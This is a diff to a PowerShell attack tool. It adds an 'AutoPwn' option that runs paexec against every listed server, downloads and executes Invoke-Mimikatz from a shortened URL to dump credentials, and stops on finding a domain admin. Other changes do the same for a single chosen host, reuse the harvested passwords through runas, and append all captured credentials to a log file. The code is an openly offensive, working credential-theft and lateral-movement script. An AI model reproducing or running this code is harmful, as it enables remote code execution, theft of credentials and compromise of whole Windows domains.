@@ -319,6 +319,7 @@ $Global:Serverlist | select item, server -unique
 
 $checklog = checklog
 $count = @($Global:Serverlist).count
+$has_da = 0
 ## Greetings
 do {
 write-host "*******************************"
@@ -334,6 +335,7 @@ write-host "Log exists for current user:`t" $checklog
 write-host "Servers in log: $count"
 write-host "`r`n"
 Write-host "Please choose from the following options:`r`n"
+write-host "1337) AutoPwn v1.0b"
 write-host "1) Find machines where I have local admin"
 write-host "2) List machines where I have local admin"
 write-host "3) Pull cached credentials on given machine"
@@ -363,6 +365,77 @@ if ($chosen -eq 99) {
 if ($chosen -eq 11) {
     write-host "Here is the current server count: $count"
 }
+
+### Option 1337
+if ($chosen -eq 1337) {
+
+    $Global:Serverlist | foreach {
+       if ($has_da -eq 0) {
+
+               $global:rhost = $_.server
+
+            .\paexec \\$global:rhost -to 30 -lo .\mim_$global:rhost.log -s powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds; exit 0" > \\LPSE53536\Shared\mim_$global:rhost.log
+                    #Out-file ".\mim_$global:rhost.log"
+                    write-host "$global:rhost: Done"
+                        #if ($LASTEXITCODE -eq 0) {
+
+
+                        #[string]$mim = Get-Content ".\mim_$global:rhost.log"
+                        #write-host (test-path ".\mim_$global:rhost.log")
+                        #write-host $global:rhost 
+                    
+                                #$TableResults = Parse-Mimikatz -raw $mim
+                            #if ($TableResults -ne $null) {
+        
+                                #$TableResults
+       
+        
+                                #read-host "..........."
+         
+                                #}
+
+                        #$TableResults | select domain, user, password -unique | format-table -autosize
+               
+                        [string]$output = Get-Content "\\$env:computername\Shared\mim_$global:rhost.log"
+                            $Global:TableResults = Parse-Mimikatz -raw $output
+                        if ($Global:TableResults -ne $null) {
+                    
+                    
+                            $Global:TableResults | select username,domain,isdomainadmin -unique | format-table -autosize
+                    
+        
+                            #read-host "..........."
+         
+                            }
+                        else {
+                           write-host "No passwords."
+                            }
+        
+                    
+                        $Global:TableResults | foreach {
+                            #write-host $_
+                            #[string]$pwtype = $_.pwtype.ToLower()
+                            $domain = $_.domain.ToLower()
+                            #write-host $domain
+                            $username = $_.username.ToLower()
+                            #write-host $username
+                            $password = $_.password
+                            #write-host $password
+                            $isdomainadmin = $_.isdomainadmin
+                                if ($isdomainadmin -eq "Yes") {
+                                    $has_da = 1}
+                            #write-host $isdomainadmin
+                            $TblCredStore.Rows.Add($domain,$username,$password,$isdomainadmin) | Out-Null
+                        
+                        
+                            # Add credential to list
+                    
+                        #}            
+                        }
+                    }
+                }
+}
+
 
 ### Option 1
 if ($chosen -eq 1) {
@@ -435,15 +508,17 @@ if ($chosen -eq 3) {
         $r = Read-Host "Select a Server to pwn"
         write-host $r
             if ($r -ne 0) {
-      ######################      $global:rhost = $serverlist.Server[$r-1]
+                $global:rhost = $serverlist.Server[$r-1]
             
-            $global:rhost = "SBOTCAR1.puget.com"
+            #$global:rhost = "SBOTCAR1.puget.com"
             #write-host $global:rhost 
             
-            #.\psexec -accepteula \\$global:rhost powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds" |
-            #Out-file ".\mim_$global:rhost.log"
-                
-                #[string]$mim = Get-Content ".\mim_$global:rhost.log"
+            .\paexec \\$global:rhost -to 30 -lo .\mim_$global:rhost.log -s powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds; exit 0" > \\LPSE53536\Shared\mim_$global:rhost.log
+            
+            #if ($LASTEXITCODE -eq 0) {
+
+               
+                #[string]$mim = Get-Content "\\LPSE53536\Shared\mim_$global:rhost.log"
                 #write-host (test-path ".\mim_$global:rhost.log")
                 #write-host $global:rhost 
                     
@@ -459,7 +534,7 @@ if ($chosen -eq 3) {
 
                 #$TableResults | select domain, user, password -unique | format-table -autosize
                
-                [string]$mim = Get-Content ".\mim_$global:rhost.log"
+                [string]$mim = Get-Content "\\LPSE53536\Shared\mim_$global:rhost.log"
                     $Global:TableResults = Parse-Mimikatz -raw $mim
                 if ($Global:TableResults -ne $null) {
                     
@@ -479,20 +554,20 @@ if ($chosen -eq 3) {
                     #write-host $_
                     #[string]$pwtype = $_.pwtype.ToLower()
                     $domain = $_.domain.ToLower()
-                    write-host $domain
+                    #write-host $domain
                     $username = $_.username.ToLower()
-                    write-host $username
+                    #write-host $username
                     $password = $_.password
-                    write-host $password
+                    #write-host $password
                     $isdomainadmin = $_.isdomainadmin
-                    write-host $isdomainadmin
+                    #write-host $isdomainadmin
                     $TblCredStore.Rows.Add($domain,$username,$password,$isdomainadmin) | Out-Null
                         
                         
                     # Add credential to list
                     
-                }            
-
+                #}            
+                }#>
                 #$TablePasswordList | select type,domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                 
                 #IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/HarmJ0y/c84065c0c487d4c74cc1/raw/70e01dfc466eaaf0e6e6ef331e9ab7d3960d1902/Invoke-Psexec.ps1')
@@ -528,8 +603,22 @@ if ($chosen -eq 4) {
 
 #Option 5
 if ($chosen -eq 5) {
+    if ($TblCredStore -ne $null) {
+        Write-host "Select credentials from the list below`r`n"
+        $TblCredStore | select username,domain,isdomainadmin -unique | format-table -autosize
+        
+        
+        $c = read-host "..........."
+        if ($c -ne $null) {
+            $pw = $TblCredStore | Where username -eq $c
+            runas /noprofile /user:"$domain\$c" /password:$pw "powershell"
+         
+        }
+    else {
+        read-host "Need to find some passwords, first"
+        }
+    
 
-    Write-host "Select credentials from the list below`r`n"
 }
 
 #Option 6
@@ -541,3 +630,4 @@ if ($chosen -eq 6) {
 ### exit
 } while ($chosen -ne 0)
 $Global:serverlist.Clear()
+$TblCredStore | out-file -append credstore.log
